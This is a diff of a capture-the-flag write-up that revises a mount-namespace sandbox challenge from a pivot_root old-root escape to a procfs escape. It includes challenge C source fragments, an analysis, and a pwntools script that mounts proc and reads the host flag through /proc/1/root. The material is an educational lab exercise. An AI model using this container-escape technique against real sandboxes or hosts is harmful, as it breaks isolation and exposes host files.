@@ -1,20 +1,21 @@
 #metadata(
   (
-    title: "Mount Namespace and pivot_root Escape",
-    description: "Escaping a mount namespace sandbox by accessing the old root filesystem which was not unmounted after pivot_root.",
+    title: "Mount Namespace Escape via Procfs",
+    description: "Escaping a hardened mount namespace by mounting procfs and accessing the host's root directory through process 1's root link.",
     date: "2026-01-04",
-    order: 14,
+    order: 15,
     draft: false,
   ),
 )<frontmatter>
 #import "../../../../typst-theme.c.typ": project
 #show: project
 
-= Mount Namespace and pivot_root Escape
+= Mount Namespace Escape via Procfs
 
 == Challenge Source Code
 
 ```c
+#define _GNU_SOURCE 1
 #include <assert.h>
 #include <fcntl.h>
 #include <sched.h>
@@ -67,6 +68,10 @@ int main(int argc, char **argv) {
   assert(mkdir("/lib64", 0755) != -1);
   assert(mount("/old/lib64", "/lib64", NULL, MS_BIND, NULL) != -1);
 
+  // Unmount the old root directory
+  assert(umount2("/old", MNT_DETACH) != -1);
+  assert(rmdir("/old") != -1);
+
   setresuid(0, 0, 0);
   assert(chdir("/") == 0);
 
@@ -80,26 +85,43 @@ int main(int argc, char **argv) {
 
 == Vulnerability Analysis
 
-The challenge uses `pivot_root` to change the system root to a new directory. `pivot_root` moves the current root mount to a specified subdirectory (in this case, `/old`) and makes the new directory the root.
+This level improves the sandbox isolation by explicitly unmounting the old root directory (`/old`) after the pivot. This prevents the simple path traversal used in the previous level.
 
-The vulnerability is that the program *fails to unmount the old root* from `/old` after the pivot. While it sets up a jail, it explicitly preserves access to the entire host filesystem at the `/old` mount point.
+However, since we are running as `root` within the namespace and there are no restrictive seccomp filters or LSM profiles (like AppArmor/SELinux), we can mount the *proc filesystem* (`procfs`).
+
+`procfs` provides a window into the kernel's view of all processes. Crucially, `/proc/<pid>/root` is a symbolic link to the root directory of a process. In many environments, process 1 (init) or other processes started before the namespace was restricted still have the original host root as their root directory.
 
 == Exploitation Plan
 
-1. *Identify Old Root:* The old root filesystem is mounted at `/old`.
-2. *Access Flag:* Since `/old` corresponds to the host's real root, the real flag (at `/flag` on the host) is accessible at `/old/flag`.
-3. *Read Flag:* Use the provided shell to read the file.
+1. *Mount Proc:* Create a new directory `/p` and mount the `proc` filesystem to it.
+2. *Access Host Root:* Traverse process 1's root link to reach the host's filesystem: `/p/1/root/`.
+3. *Read Flag:* Read the real flag located at `/p/1/root/flag`.
 
 == Exploit Script
+
+The following script interacts with the shell spawned inside the jail. It executes standard Linux commands to mount `procfs` and access the host root.
 
 ```python
 from pwn import *
 
-elf = context.binary = ELF("./challenge")
+# Set the target binary
+elf = context.binary = ELF("./challenge", checksec=False)
 
+# Start the process
 p = process(elf.path)
 
-# Access the flag through the preserved root
-p.sendline(b"cat /old/flag")
-print(p.recvall().decode())
+# 1. Create a directory for proc (in / which exists)
+p.sendline(b"mkdir /p")
+
+# 2. Mount the proc filesystem
+p.sendline(b"mount -t proc proc /p")
+
+# 3. Read the flag from the host root via /proc/1/root
+p.sendline(b"cat /p/1/root/flag")
+
+# 4. Exit the shell
+p.sendline(b"exit")
+
+# Receive the output and print the flag
+print(p.recvall(timeout=2).decode())
 ```
